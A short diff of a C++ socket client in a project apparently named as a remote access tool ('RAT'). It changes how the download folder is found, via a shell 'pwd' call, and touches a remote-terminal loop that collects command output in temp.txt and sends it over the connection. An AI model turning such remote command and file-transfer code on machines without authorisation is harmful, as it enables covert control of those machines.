@@ -16,7 +16,6 @@
 
 using namespace std;
 
-string FILE_SAVE_PLACE{"/home/dachoa1005/WorkSpace/RAT/client/recv_files/"};
 
 int main(int argc, char const *argv[])
 {
@@ -32,6 +31,15 @@ int main(int argc, char const *argv[])
     cout << "Enter port number: ";
     cin >> portno;
     struct hostent *host = gethostbyname(serverIP);
+
+    //get file save location
+    system("pwd > pwd.txt");
+    ifstream pwdFile("pwd.txt");
+    string pwd;
+    pwdFile >> pwd;
+    string FILE_SAVE_PLACE = pwd+ "/recv_files/";
+    pwdFile.close();
+    cout << FILE_SAVE_PLACE << endl;
 
     sockaddr_in sendSockAddr;
     bzero((char *)&sendSockAddr, sizeof(sendSockAddr));
@@ -97,7 +105,8 @@ int main(int argc, char const *argv[])
         }
 
         case 3:
-        {
+        {   
+            cout << "Terminal" << endl;
             fstream file;
             string command;
             while (true)
@@ -120,10 +129,11 @@ int main(int argc, char const *argv[])
                 {
                     cout << line << endl;
                 }
+                file << "";
                 file.close();
+                 
                 send_file("temp.txt", "temp.txt", clientSockfd);
             }
-            cout << "Done" << endl;
             break;
         }
         case 0:
